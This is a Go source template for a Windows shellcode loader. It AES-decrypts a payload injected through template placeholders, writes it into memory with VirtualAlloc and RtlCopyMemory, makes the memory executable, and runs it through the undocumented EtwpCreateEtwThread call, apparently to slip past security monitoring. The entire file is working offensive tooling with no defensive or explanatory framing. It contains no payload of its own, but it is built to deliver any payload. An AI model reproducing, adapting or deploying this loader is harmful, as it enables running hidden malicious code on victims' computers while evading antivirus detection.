package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualProtect      = kernel32.NewProc("VirtualProtect")
	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
	EtwpCreateEtwThread = ntdll.NewProc("EtwpCreateEtwThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

// Decrypt: Encrypted Text --> Base64 Decode --> Decrypt with IV and Key
func Decrypt(key []byte, encryptedText string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(encryptedText)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// Using IV
	iv := ciphertext[:aes.BlockSize]

	// Checking BlockSize = IV
	if len(iv) != aes.BlockSize {
		panic("[Error] Ciphertext is too short!")
	}

	ciphertext = ciphertext[aes.BlockSize:]

	// Decryption Process
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	return string(ciphertext)
}

func Execute(shellcode []byte) {
	addr, _, errVirtualAlloc := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic("[ERROR] Call to VirtualAlloc failed!")
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		panic("[ERROR] Call to RtlCopyMemory failed!")
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		panic("[ERROR] Call to VirtualProtect failed!")
	}

	thread, _, errEtwThread := EtwpCreateEtwThread.Call(
		addr,
		uintptr(0),
	)
	if errEtwThread != nil && errEtwThread.Error() != "The operation completed successfully." {
		panic("[ERROR] Call to EtwpCreateEtwThread failed!")
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(
		thread,
		0xFFFFFFFF,
	)
	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		panic("[ERROR] Call to WaitForSingleObject failed!")
	}
}

func main() {
	encShellcode := "{{.Shellcode}}"
	key := []byte("{{.Key}}")

	// Decrypt base64/AES to original value
	decShellcode := Decrypt(key, encShellcode)

	shellcode, err := hex.DecodeString(decShellcode)

	if err != nil {
		fmt.Printf("[ERROR] Error Decoding: %s\n", err)
		os.Exit(1)
	}

	Execute(shellcode)
}